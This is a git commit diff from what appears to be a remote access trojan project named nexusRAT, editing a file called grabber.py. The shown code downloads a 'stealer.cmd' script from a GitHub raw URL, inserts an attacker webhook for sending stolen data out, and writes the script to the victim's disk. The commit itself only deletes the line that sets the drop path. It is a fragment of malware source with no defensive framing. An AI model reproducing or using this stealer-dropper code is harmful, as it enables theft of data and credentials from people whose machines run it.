326631b68c3dd5797fda96a5da0274a12293fc19
hai17233 <135570073+hai17233@users.noreply.github.com>
2023-12-20 20:40:14 +0700

    Update grabber.py

--- rat/grabber.py
+++ rat/grabber.py
@@ -5,7 +5,6 @@ from setting import *
 stealerurl = "https://raw.githubusercontent.com/hai723/nexusRAT/main/scr/stealer.cmd"
 stealer = requests.get(stealerurl).text
 stealer = stealer.replace("stealerwebhook", hook)
-stealerpath = "C:\rip.cmd"
 
 with open(stealerpath, "w", encoding="utf-8") as file:
     file.write(stealer)
